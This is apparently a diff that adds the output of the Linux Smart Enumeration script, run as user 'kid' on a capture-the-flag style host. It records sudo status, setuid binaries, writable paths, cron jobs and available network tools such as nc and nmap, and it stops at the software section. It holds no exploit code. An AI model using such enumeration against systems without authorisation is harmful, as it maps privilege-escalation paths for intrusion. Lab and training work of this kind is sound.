@@ -1,0 +1,699 @@
+[90m---
+[90m---
+
+[96m LSE Version:[0;0m 3.1
+
+[94m        User:[0;0m kid
+[94m     User ID:[0;0m 1000
+[94m    Password:[0;0m [90mnone[0;0m
+[94m        Home:[0;0m /home/kid
+[94m        Path:[0;0m /var/lib/gems/2.7.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+[94m       umask:[0;0m 0022
+
+[94m    Hostname:[0;0m scriptkiddie
+[94m       Linux:[0;0m 5.4.0-65-generic
+[94mDistribution:[0;0m Ubuntu 20.04.1 LTS
+[94mArchitecture:[0;0m x86_64
+
+[35m==================================================================([32m users [35m)=====[0;0m
+[97m[[94mi[97m] [90musr000[97m Current user groups[90m.............................................[34m yes![0;0m
+[97m[[93m*[97m] [90musr010[97m Is current user in an administrative group?[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90musr020[97m Are there other users in an administrative groups?[90m..............[36m yes![0;0m
+[90m---[0;0m
+[01;31m[Kadm[m[K:x:4[01;31m[K:syslog[m[K
+[90m---[0;0m
+[97m[[93m*[97m] [90musr030[97m Other users with shell[90m..........................................[36m yes![0;0m
+[90m---[0;0m
+root:x:0:0:root:/root[01;31m[K:/bin/bash[m[K
+kid:x:1000:1000:kid:/home/kid[01;31m[K:/bin/bash[m[K
+pwn:x:1001:1001::/home/pwn[01;31m[K:/bin/bash[m[K
+[90m---[0;0m
+[97m[[94mi[97m] [90musr040[97m Environment information[90m......................................... [90mskip
+[97m[[94mi[97m] [90musr050[97m Groups for other users[90m.......................................... [90mskip
+[97m[[94mi[97m] [90musr060[97m Other users[90m..................................................... [90mskip
+[97m[[93m*[97m] [90musr070[97m PATH variables defined inside /etc[90m..............................[36m yes![0;0m
+[90m---[0;0m
+/bin
+/sbin
+/snap/bin
+/usr/bin
+/usr/games
+/usr/local/bin
+/usr/local/games
+/usr/local/sbin
+/usr/sbin
+/usr/sbin/
+[90m---[0;0m
+[97m[[91m![97m] [90musr080[97m Is '.' in a PATH variable defined inside /etc?[90m..................[90m nope[0;0m
+[35m===================================================================([32m sudo [35m)=====[0;0m
+[97m[[91m![97m] [90msud000[97m Can we sudo without a password?[90m.................................[90m nope[0;0m
+[97m[[91m![97m] [90msud010[97m Can we list sudo commands without a password?[90m...................[90m nope[0;0m
+[97m[[93m*[97m] [90msud040[97m Can we read sudoers files?[90m......................................[90m nope[0;0m
+[97m[[93m*[97m] [90msud050[97m Do we know if any other users used sudo?[90m........................[36m yes![0;0m
+[90m---[0;0m
+kid
+[90m---[0;0m
+[35m============================================================([32m file system [35m)=====[0;0m
+[97m[[93m*[97m] [90mfst000[97m Writable files outside user's home[90m..............................[36m yes![0;0m
+[90m---[0;0m
+/snap/core18/1880/dev/null
+/snap/core18/1880/dev/random
+/snap/core18/1880/dev/urandom
+/snap/core18/1880/dev/zero
+/snap/core18/1944/dev/null
+/snap/core18/1944/dev/random
+/snap/core18/1944/dev/urandom
+/snap/core18/1944/dev/zero
+/tmp
+/tmp/.XIM-unix
+/tmp/tmp.8pKTOk7m5S
+/tmp/.font-unix
+/tmp/tmp.8b4AkV6Zoc
+/tmp/tmp.nZ4GecJyDI
+/tmp/hsperfdata_kid
+/tmp/sort0LFesa
+/tmp/oqkvzvz
+/tmp/rmonrd
+/tmp/post
+/tmp/post/s.txt
+/tmp/post/exploit.py
+/tmp/post/linpeas.sh
+/tmp/f
+/tmp/win
+/tmp/tmux-1000
+/tmp/tmp.HsuC9jfdKY
+/tmp/.X11-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/var/lib/gems/2.7.0/cache/dnsruby-1.61.4.gem
+/var/lib/gems/2.7.0/cache/em-http-request-1.1.7.gem
+/var/lib/gems/2.7.0/cache/jmespath-1.4.0.gem
+/var/lib/gems/2.7.0/cache/bson-4.10.0.gem
+/var/lib/gems/2.7.0/cache/rex-registry-0.1.3.gem
+/var/lib/gems/2.7.0/cache/ruby-progressbar-1.10.1.gem
+/var/lib/gems/2.7.0/cache/factory_bot_rails-6.1.0.gem
+/var/lib/gems/2.7.0/cache/rkelly-remix-0.0.7.gem
+/var/lib/gems/2.7.0/cache/memory_profiler-0.9.14.gem
+/var/lib/gems/2.7.0/cache/aws-partitions-1.374.0.gem
+/var/lib/gems/2.7.0/cache/builder-3.2.4.gem
+/var/lib/gems/2.7.0/cache/net-ssh-6.1.0.gem
+/var/lib/gems/2.7.0/cache/rails-dom-testing-2.0.3.gem
+/var/lib/gems/2.7.0/cache/rex-text-0.2.28.gem
+/var/lib/gems/2.7.0/cache/metasploit_data_models-4.0.2.gem
+/var/lib/gems/2.7.0/cache/bcrypt-3.1.16.gem
+/var/lib/gems/2.7.0/cache/octokit-4.18.0.gem
+/var/lib/gems/2.7.0/cache/openssl-ccm-1.2.2.gem
+/var/lib/gems/2.7.0/cache/em-socksify-0.3.2.gem
+/var/lib/gems/2.7.0/cache/loofah-2.7.0.gem
+/var/lib/gems/2.7.0/cache/jsobfu-0.4.2.gem
+/var/lib/gems/2.7.0/cache/metasploit_payloads-mettle-1.0.2.gem
+/var/lib/gems/2.7.0/cache/rubocop-0.91.1.gem
+/var/lib/gems/2.7.0/cache/openvas-omp-0.0.4.gem
+/var/lib/gems/2.7.0/cache/concurrent-ruby-1.0.5.gem
+/var/lib/gems/2.7.0/cache/afm-0.2.2.gem
+/var/lib/gems/2.7.0/cache/hrr_rb_ssh-0.3.0.pre2.gem
+/var/lib/gems/2.7.0/cache/metasploit-concern-3.0.0.gem
+/var/lib/gems/2.7.0/cache/unf-0.1.4.gem
+/var/lib/gems/2.7.0/cache/http_parser.rb-0.6.0.gem
+/var/lib/gems/2.7.0/cache/patch_finder-1.0.2.gem
+/var/lib/gems/2.7.0/cache/faker-2.14.0.gem
+/var/lib/gems/2.7.0/cache/bindata-2.4.8.gem
+/var/lib/gems/2.7.0/cache/faye-websocket-0.11.0.gem
+/var/lib/gems/2.7.0/cache/sinatra-2.1.0.gem
+/var/lib/gems/2.7.0/cache/Ascii85-1.0.3.gem
+/var/lib/gems/2.7.0/cache/sqlite3-1.3.13.gem
+/var/lib/gems/2.7.0/cache/thor-1.0.1.gem
+/var/lib/gems/2.7.0/cache/ruby2_keywords-0.0.2.gem
+/var/lib/gems/2.7.0/cache/ttfunk-1.6.2.1.gem
+/var/lib/gems/2.7.0/cache/arel-9.0.0.gem
+/var/lib/gems/2.7.0/cache/ruby-prof-1.4.1.gem
+/var/lib/gems/2.7.0/cache/rainbow-3.0.0.gem
+/var/lib/gems/2.7.0/cache/metasploit-model-3.0.0.gem
+/var/lib/gems/2.7.0/cache/rspec-expectations-3.9.2.gem
+/var/lib/gems/2.7.0/cache/rex-core-0.1.13.gem
+/var/lib/gems/2.7.0/cache/regexp_parser-1.8.0.gem
+/var/lib/gems/2.7.0/cache/aws-sdk-iam-1.45.0.gem
+/var/lib/gems/2.7.0/cache/ruby_smb-2.0.6.gem
+/var/lib/gems/2.7.0/cache/mini_portile2-2.4.0.gem
+/var/lib/gems/2.7.0/cache/tzinfo-1.2.7.gem
+/var/lib/gems/2.7.0/cache/metasm-1.0.4.gem
+/var/lib/gems/2.7.0/cache/rspec-support-3.9.3.gem
+/var/lib/gems/2.7.0/cache/metasploit-payloads-2.0.14.gem
+/var/lib/gems/2.7.0/cache/timecop-0.9.1.gem
+/var/lib/gems/2.7.0/cache/minitest-5.14.2.gem
+/var/lib/gems/2.7.0/cache/rex-zip-0.1.3.gem
+/var/lib/gems/2.7.0/cache/public_suffix-4.0.6.gem
+/var/lib/gems/2.7.0/cache/warden-1.2.9.gem
+/var/lib/gems/2.7.0/cache/thread_safe-0.3.6.gem
+/var/lib/gems/2.7.0/cache/aws-sigv4-1.2.2.gem
+/var/lib/gems/2.7.0/cache/parallel-1.19.2.gem
+/var/lib/gems/2.7.0/cache/diff-lcs-1.4.4.gem
+/var/lib/gems/2.7.0/cache/redcarpet-3.5.0.gem
+/var/lib/gems/2.7.0/cache/rubyzip-2.3.0.gem
+/var/lib/gems/2.7.0/cache/bcrypt_pbkdf-1.0.1.gem
+/var/lib/gems/2.7.0/cache/rex-struct2-0.1.2.gem
+/var/lib/gems/2.7.0/cache/nexpose-7.2.1.gem
+/var/lib/gems/2.7.0/cache/rspec-core-3.9.2.gem
+/var/lib/gems/2.7.0/cache/unicode-display_width-1.7.0.gem
+/var/lib/gems/2.7.0/cache/rex-ole-0.1.6.gem
+/var/lib/gems/2.7.0/cache/byebug-11.1.3.gem
+/var/lib/gems/2.7.0/cache/parser-2.7.1.5.gem
+/var/lib/gems/2.7.0/cache/addressable-2.7.0.gem
+/var/lib/gems/2.7.0/cache/reline-0.1.5.gem
+/var/lib/gems/2.7.0/cache/websocket-driver-0.7.3.gem
+/var/lib/gems/2.7.0/cache/multipart-post-2.1.1.gem
+/var/lib/gems/2.7.0/cache/rb-readline-0.5.5.gem
+/var/lib/gems/2.7.0/cache/rubocop-ast-0.4.2.gem
+/var/lib/gems/2.7.0/cache/hashery-2.1.2.gem
+/var/lib/gems/2.7.0/cache/ed25519-1.2.4.gem
+/var/lib/gems/2.7.0/cache/rex-arch-0.1.13.gem
+/var/lib/gems/2.7.0/cache/fivemat-1.3.7.gem
+/var/lib/gems/2.7.0/cache/activemodel-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/msgpack-1.3.3.gem
+/var/lib/gems/2.7.0/cache/unf_ext-0.0.7.7.gem
+/var/lib/gems/2.7.0/cache/aws-eventstream-1.1.0.gem
+/var/lib/gems/2.7.0/cache/metasploit-credential-4.0.2.gem
+/var/lib/gems/2.7.0/cache/actionpack-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/cookiejar-0.3.3.gem
+/var/lib/gems/2.7.0/cache/io-console-0.5.6.gem
+/var/lib/gems/2.7.0/cache/pdf-reader-2.4.1.gem
+/var/lib/gems/2.7.0/cache/simplecov-html-0.12.3.gem
+/var/lib/gems/2.7.0/cache/rex-rop_builder-0.1.3.gem
+/var/lib/gems/2.7.0/cache/packetfu-1.1.13.gem
+/var/lib/gems/2.7.0/cache/rex-exploitation-0.1.24.gem
+/var/lib/gems/2.7.0/cache/bit-struct-0.16.gem
+/var/lib/gems/2.7.0/cache/sshkey-2.0.0.gem
+/var/lib/gems/2.7.0/cache/mqtt-0.5.0.gem
+/var/lib/gems/2.7.0/cache/method_source-1.0.0.gem
+/var/lib/gems/2.7.0/cache/rspec-mocks-3.9.1.gem
+/var/lib/gems/2.7.0/cache/actionview-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/aws-sdk-ec2-1.195.0.gem
+/var/lib/gems/2.7.0/cache/recog-2.3.14.gem
+/var/lib/gems/2.7.0/cache/websocket-extensions-0.1.5.gem
+/var/lib/gems/2.7.0/cache/rex-powershell-0.1.87.gem
+/var/lib/gems/2.7.0/cache/rex-encoder-0.1.4.gem
+/var/lib/gems/2.7.0/cache/rack-protection-2.1.0.gem
+/var/lib/gems/2.7.0/cache/eventmachine-1.2.7.gem
+/var/lib/gems/2.7.0/cache/rex-sslscan-0.1.5.gem
+/var/lib/gems/2.7.0/cache/simplecov-0.18.2.gem
+/var/lib/gems/2.7.0/cache/pry-byebug-3.9.0.gem
+/var/lib/gems/2.7.0/cache/arel-helpers-2.11.0.gem
+/var/lib/gems/2.7.0/cache/rspec-rails-4.0.1.gem
+/var/lib/gems/2.7.0/cache/pry-0.13.1.gem
+/var/lib/gems/2.7.0/cache/filesize-0.2.0.gem
+/var/lib/gems/2.7.0/cache/rex-java-0.1.5.gem
+/var/lib/gems/2.7.0/cache/rubyntlm-0.6.2.gem
+/var/lib/gems/2.7.0/cache/rails-html-sanitizer-1.3.0.gem
+/var/lib/gems/2.7.0/cache/net-ldap-0.16.3.gem
+/var/lib/gems/2.7.0/cache/ruby-macho-2.2.0.gem
+/var/lib/gems/2.7.0/cache/thin-1.7.2.gem
+/var/lib/gems/2.7.0/cache/railties-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/simpleidn-0.1.1.gem
+/var/lib/gems/2.7.0/cache/aws-sdk-core-3.107.0.gem
+/var/lib/gems/2.7.0/cache/rspec-3.9.0.gem
+/var/lib/gems/2.7.0/cache/rack-2.2.3.gem
+/var/lib/gems/2.7.0/cache/windows_error-0.1.2.gem
+/var/lib/gems/2.7.0/cache/nokogiri-1.10.10.gem
+/var/lib/gems/2.7.0/cache/faraday-1.0.1.gem
+/var/lib/gems/2.7.0/cache/json-2.3.1.gem
+/var/lib/gems/2.7.0/cache/activesupport-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/docile-1.3.2.gem
+/var/lib/gems/2.7.0/cache/xdr-3.0.1.gem
+/var/lib/gems/2.7.0/cache/sawyer-0.8.2.gem
+/var/lib/gems/2.7.0/cache/pg-1.2.3.gem
+/var/lib/gems/2.7.0/cache/pcaprub-0.13.0.gem
+/var/lib/gems/2.7.0/cache/activerecord-5.2.4.4.gem
+/var/lib/gems/2.7.0/cache/aws-sdk-kms-1.38.0.gem
+/var/lib/gems/2.7.0/cache/rex-socket-0.1.24.gem
+/var/lib/gems/2.7.0/cache/mustermann-1.1.1.gem
+/var/lib/gems/2.7.0/cache/ruby-rc4-0.1.5.gem
+/var/lib/gems/2.7.0/cache/network_interface-0.0.2.gem
+/var/lib/gems/2.7.0/cache/factory_bot-6.1.0.gem
+/var/lib/gems/2.7.0/cache/crass-1.0.6.gem
+/var/lib/gems/2.7.0/cache/rex-bin_tools-0.1.6.gem
+/var/lib/gems/2.7.0/cache/rex-random_identifier-0.1.4.gem
+/var/lib/gems/2.7.0/cache/ast-2.4.1.gem
+/var/lib/gems/2.7.0/cache/rex-mime-0.1.5.gem
+/var/lib/gems/2.7.0/cache/yard-0.9.25.gem
+/var/lib/gems/2.7.0/cache/erubi-1.9.0.gem
+/var/lib/gems/2.7.0/cache/daemons-1.3.1.gem
+/var/lib/gems/2.7.0/cache/openssl-cmac-2.0.1.gem
+/var/lib/gems/2.7.0/cache/irb-1.2.7.gem
+/var/lib/gems/2.7.0/cache/rack-test-1.1.0.gem
+/var/lib/gems/2.7.0/cache/nessus_rest-0.1.6.gem
+/var/lib/gems/2.7.0/cache/tilt-2.0.10.gem
+/var/lib/gems/2.7.0/cache/rexml-3.2.4.gem
+/var/lib/gems/2.7.0/cache/swagger-blocks-3.0.0.gem
+/var/lib/gems/2.7.0/cache/aws-sdk-s3-1.81.0.gem
+/var/lib/gems/2.7.0/cache/i18n-1.8.5.gem
+/var/lib/gems/2.7.0/cache/tzinfo-data-1.2020.1.gem
+/var/lib/gems/2.7.0/cache/rspec-rerun-1.1.0.gem
+/var/lib/gems/2.7.0/cache/coderay-1.1.3.gem
+/var/lib/gems/2.7.0/cache/rex-nop-0.1.1.gem
+/var/tmp
+/var/crash
+/run/uuidd/request
+/run/snapd-snap.socket
+/run/snapd.socket
+/run/dbus/system_bus_socket
+/run/vmware/guestServicePipe
+/run/user/1000
+/run/user/1000/dbus-1
+/run/user/1000/dbus-1/services
+/run/user/1000/snapd-session-agent.socket
+/run/user/1000/pk-debconf-socket
+/run/user/1000/gnupg
+/run/user/1000/gnupg/S.gpg-agent
+/run/user/1000/gnupg/S.gpg-agent.ssh
+/run/user/1000/gnupg/S.gpg-agent.extra
+/run/user/1000/gnupg/S.gpg-agent.browser
+/run/user/1000/gnupg/S.dirmngr
+/run/user/1000/bus
+/run/user/1000/systemd
+/run/user/1000/systemd/private
+/run/user/1000/systemd/notify
+/run/user/1000/systemd/units
+/run/screen
+/run/screen/S-kid
+/run/systemd/journal/socket
+/run/systemd/journal/stdout
+/run/systemd/journal/dev-log
+/run/systemd/journal/syslog
+/run/systemd/userdb/io.systemd.DynamicUser
+/run/systemd/private
+/run/systemd/notify
+/run/lock
+/run/user/1000/systemd/units/invocation:gpg-agent.service
+/run/user/1000/systemd/units/invocation:dirmngr.service
+/run/user/1000/systemd/units/invocation:dbus.service
+/run/user/1000/systemd/units/invocation:dbus.socket
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst010[97m Binaries with setuid bit[90m........................................[36m yes![0;0m
+[90m---[0;0m
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/at
+/snap/snapd/10707/usr/lib/snapd/snap-confine
+/snap/snapd/10492/usr/lib/snapd/snap-confine
+/snap/core18/1880/bin/mount
+/snap/core18/1880/bin/ping
+/snap/core18/1880/bin/su
+/snap/core18/1880/bin/umount
+/snap/core18/1880/usr/bin/chfn
+/snap/core18/1880/usr/bin/chsh
+/snap/core18/1880/usr/bin/gpasswd
+/snap/core18/1880/usr/bin/newgrp
+/snap/core18/1880/usr/bin/passwd
+/snap/core18/1880/usr/bin/sudo
+/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1880/usr/lib/openssh/ssh-keysign
+/snap/core18/1944/bin/mount
+/snap/core18/1944/bin/ping
+/snap/core18/1944/bin/su
+/snap/core18/1944/bin/umount
+/snap/core18/1944/usr/bin/chfn
+/snap/core18/1944/usr/bin/chsh
+/snap/core18/1944/usr/bin/gpasswd
+/snap/core18/1944/usr/bin/newgrp
+/snap/core18/1944/usr/bin/passwd
+/snap/core18/1944/usr/bin/sudo
+/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1944/usr/lib/openssh/ssh-keysign
+[90m---[0;0m
+[97m[[91m![97m] [90mfst020[97m Uncommon setuid binaries[90m........................................[92m yes![0;0m
+[90m---[0;0m
+/snap/snapd/10707/usr/lib/snapd/snap-confine
+/snap/snapd/10492/usr/lib/snapd/snap-confine
+/snap/core18/1880/bin/mount
+/snap/core18/1880/bin/ping
+/snap/core18/1880/bin/su
+/snap/core18/1880/bin/umount
+/snap/core18/1880/usr/bin/chfn
+/snap/core18/1880/usr/bin/chsh
+/snap/core18/1880/usr/bin/gpasswd
+/snap/core18/1880/usr/bin/newgrp
+/snap/core18/1880/usr/bin/passwd
+/snap/core18/1880/usr/bin/sudo
+/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1880/usr/lib/openssh/ssh-keysign
+/snap/core18/1944/bin/mount
+/snap/core18/1944/bin/ping
+/snap/core18/1944/bin/su
+/snap/core18/1944/bin/umount
+/snap/core18/1944/usr/bin/chfn
+/snap/core18/1944/usr/bin/chsh
+/snap/core18/1944/usr/bin/gpasswd
+/snap/core18/1944/usr/bin/newgrp
+/snap/core18/1944/usr/bin/passwd
+/snap/core18/1944/usr/bin/sudo
+/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1944/usr/lib/openssh/ssh-keysign
+[90m---[0;0m
+[97m[[91m![97m] [90mfst030[97m Can we write to any setuid binary?[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst040[97m Binaries with setgid bit[90m........................................ [90mskip
+[97m[[91m![97m] [90mfst050[97m Uncommon setgid binaries[90m........................................ [90mskip
+[97m[[91m![97m] [90mfst060[97m Can we write to any setgid binary?[90m.............................. [90mskip
+[97m[[93m*[97m] [90mfst070[97m Can we read /root?[90m..............................................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst080[97m Can we read subdirectories under /home?[90m.........................[36m yes![0;0m
+[90m---[0;0m
+total 44
+drwxr-xr-x 6 pwn  pwn  4096 Feb  3 12:06 .
+drwxr-xr-x 4 root root 4096 Feb  3 07:40 ..
+lrwxrwxrwx 1 root root    9 Feb  3 12:06 .bash_history -> /dev/null
+-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
+drwx------ 2 pwn  pwn  4096 Jan 28 17:08 .cache
+drwxrwxr-x 3 pwn  pwn  4096 Jan 28 17:24 .local
+-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
+-rw-rw-r-- 1 pwn  pwn    74 Jan 28 16:22 .selected_editor
+drwx------ 2 pwn  pwn  4096 Feb 10 16:10 .ssh
+drwxrw---- 2 pwn  pwn  4096 Apr 11 17:40 recon
+-rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst090[97m SSH files in home directories[90m...................................[36m yes![0;0m
+[90m---[0;0m
+-rw-rw-r-- 1 kid kid 553 Apr 11 17:14 /home/kid/.ssh/authorized_keys
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst100[97m Useful binaries[90m.................................................[36m yes![0;0m
+[90m---[0;0m
+/usr/bin/curl
+/usr/bin/dig
+/usr/bin/gcc
+/usr/bin/nc.openbsd
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/nmap
+/usr/bin/wget
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst110[97m Other interesting files in home directories[90m.....................[90m nope[0;0m
+[97m[[91m![97m] [90mfst120[97m Are there any credentials in fstab/mtab?[90m........................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst130[97m Does 'kid' have mail?[90m...........................................[90m nope[0;0m
+[97m[[91m![97m] [90mfst140[97m Can we access other users mail?[90m.................................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst150[97m Looking for GIT/SVN repositories[90m................................[36m yes![0;0m
+[90m---[0;0m
+/opt/exploit-database/.git
+/opt/exploitdb/.git
+[90m---[0;0m
+[97m[[91m![97m] [90mfst160[97m Can we write to critical files?[90m.................................[90m nope[0;0m
+[97m[[91m![97m] [90mfst170[97m Can we write to critical directories?[90m...........................[90m nope[0;0m
+[97m[[91m![97m] [90mfst180[97m Can we write to directories from PATH defined in /etc?[90m..........[90m nope[0;0m
+[97m[[91m![97m] [90mfst190[97m Can we read any backup?[90m.........................................[90m nope[0;0m
+[97m[[91m![97m] [90mfst200[97m Are there possible credentials in any shell history file?[90m.......[90m nope[0;0m
+[97m[[94mi[97m] [90mfst500[97m Files owned by user 'kid'[90m....................................... [90mskip
+[97m[[94mi[97m] [90mfst510[97m SSH files anywhere[90m.............................................. [90mskip
+[97m[[94mi[97m] [90mfst520[97m Check hosts.equiv file and its contents[90m......................... [90mskip
+[97m[[94mi[97m] [90mfst530[97m List NFS server shares[90m.......................................... [90mskip
+[97m[[94mi[97m] [90mfst540[97m Dump fstab file[90m................................................. [90mskip
+[35m=================================================================([32m system [35m)=====[0;0m
+[97m[[94mi[97m] [90msys000[97m Who is logged in[90m................................................ [90mskip
+[97m[[94mi[97m] [90msys010[97m Last logged in users[90m............................................ [90mskip
+[97m[[91m![97m] [90msys020[97m Does the /etc/passwd have hashes?[90m...............................[90m nope[0;0m
+[97m[[91m![97m] [90msys022[97m Does the /etc/group have hashes?[90m................................[90m nope[0;0m
+[97m[[91m![97m] [90msys030[97m Can we read shadow files?[90m.......................................[90m nope[0;0m
+[97m[[93m*[97m] [90msys040[97m Check for other superuser accounts[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90msys050[97m Can root user log in via SSH?[90m...................................[90m nope[0;0m
+[97m[[94mi[97m] [90msys060[97m List available shells[90m........................................... [90mskip
+[97m[[94mi[97m] [90msys070[97m System umask in /etc/login.defs[90m................................. [90mskip
+[97m[[94mi[97m] [90msys080[97m System password policies in /etc/login.defs[90m..................... [90mskip
+[35m===============================================================([32m security [35m)=====[0;0m
+[97m[[93m*[97m] [90msec000[97m Is SELinux present?[90m.............................................[90m nope[0;0m
+[97m[[93m*[97m] [90msec010[97m List files with capabilities[90m....................................[36m yes![0;0m
+[90m---[0;0m
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+[90m---[0;0m
+[97m[[91m![97m] [90msec020[97m Can we write to a binary with caps?[90m.............................[90m nope[0;0m
+[97m[[91m![97m] [90msec030[97m Do we have all caps in any binary?[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90msec040[97m Users with associated capabilities[90m..............................[90m nope[0;0m
+[97m[[91m![97m] [90msec050[97m Does current user have capabilities?[90m............................ [90mskip
+[97m[[91m![97m] [90msec060[97m Can we read the auditd log?[90m.....................................[90m nope[0;0m
+[35m========================================================([32m recurrent tasks [35m)=====[0;0m
+[97m[[93m*[97m] [90mret000[97m User crontab[90m....................................................[90m nope[0;0m
+[97m[[91m![97m] [90mret010[97m Cron tasks writable by user[90m.....................................[90m nope[0;0m
+[97m[[93m*[97m] [90mret020[97m Cron jobs[90m.......................................................[36m yes![0;0m
+[90m---[0;0m
+/etc/crontab:SHELL=/bin/sh
+/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+/etc/cron.d/popularity-contest:SHELL=/bin/sh
+/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/popularity-contest:47 3 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
+/etc/cron.d/e2scrub_all:30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+/etc/cron.d/e2scrub_all:10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+[90m---[0;0m
+[97m[[93m*[97m] [90mret030[97m Can we read user crontabs[90m.......................................[90m nope[0;0m
+[97m[[93m*[97m] [90mret040[97m Can we list other user cron tasks?[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90mret050[97m Can we write to any paths present in cron jobs[90m..................[36m yes![0;0m
+[90m---[0;0m
+/dev/null
+/dev/urandom
+/var/crash
+/var/crash/.
+[90m---[0;0m
+[97m[[91m![97m] [90mret060[97m Can we write to executable paths present in cron jobs[90m...........[90m nope[0;0m
+[97m[[94mi[97m] [90mret400[97m Cron files[90m...................................................... [90mskip
+[97m[[93m*[97m] [90mret500[97m User systemd timers[90m.............................................[90m nope[0;0m
+[97m[[91m![97m] [90mret510[97m Can we write in any system timer?[90m...............................[90m nope[0;0m
+[97m[[94mi[97m] [90mret900[97m Systemd timers[90m.................................................. [90mskip
+[35m================================================================([32m network [35m)=====[0;0m
+[97m[[93m*[97m] [90mnet000[97m Services listening only on localhost[90m............................[90m nope[0;0m
+[97m[[91m![97m] [90mnet010[97m Can we sniff traffic with tcpdump?[90m..............................[90m nope[0;0m
+[97m[[94mi[97m] [90mnet500[97m NIC and IP information[90m.......................................... [90mskip
+[97m[[94mi[97m] [90mnet510[97m Routing table[90m................................................... [90mskip
+[97m[[94mi[97m] [90mnet520[97m ARP table[90m....................................................... [90mskip
+[97m[[94mi[97m] [90mnet530[97m Namerservers[90m.................................................... [90mskip
+[97m[[94mi[97m] [90mnet540[97m Systemd Nameservers[90m............................................. [90mskip
+[97m[[94mi[97m] [90mnet550[97m Listening TCP[90m................................................... [90mskip
+[97m[[94mi[97m] [90mnet560[97m Listening UDP[90m................................................... [90mskip
+[35m===============================================================([32m services [35m)=====[0;0m
+[97m[[91m![97m] [90msrv000[97m Can we write in service files?[90m..................................[90m nope[0;0m
+[97m[[91m![97m] [90msrv010[97m Can we write in binaries executed by services?[90m..................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv020[97m Files in /etc/init.d/ not belonging to root[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv030[97m Files in /etc/rc.d/init.d not belonging to root[90m.................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv040[97m Upstart files not belonging to root[90m.............................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv050[97m Files in /usr/local/etc/rc.d not belonging to root[90m..............[90m nope[0;0m
+[97m[[94mi[97m] [90msrv400[97m Contents of /etc/inetd.conf[90m..................................... [90mskip
+[97m[[94mi[97m] [90msrv410[97m Contents of /etc/xinetd.conf[90m.................................... [90mskip
+[97m[[94mi[97m] [90msrv420[97m List /etc/xinetd.d if used[90m...................................... [90mskip
+[97m[[94mi[97m] [90msrv430[97m List /etc/init.d/ permissions[90m................................... [90mskip
+[97m[[94mi[97m] [90msrv440[97m List /etc/rc.d/init.d permissions[90m............................... [90mskip
+[97m[[94mi[97m] [90msrv450[97m List /usr/local/etc/rc.d permissions[90m............................ [90mskip
+[97m[[94mi[97m] [90msrv460[97m List /etc/init/ permissions[90m..................................... [90mskip
+[97m[[91m![97m] [90msrv500[97m Can we write in systemd service files?[90m..........................[90m nope[0;0m
+[97m[[91m![97m] [90msrv510[97m Can we write in binaries executed by systemd services?[90m..........[90m nope[0;0m
+[97m[[93m*[97m] [90msrv520[97m Systemd files not belonging to root[90m.............................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv900[97m Systemd config files permissions[90m................................ [90mskip
+[35m===============================================================([32m software [35m)=====[0;0m
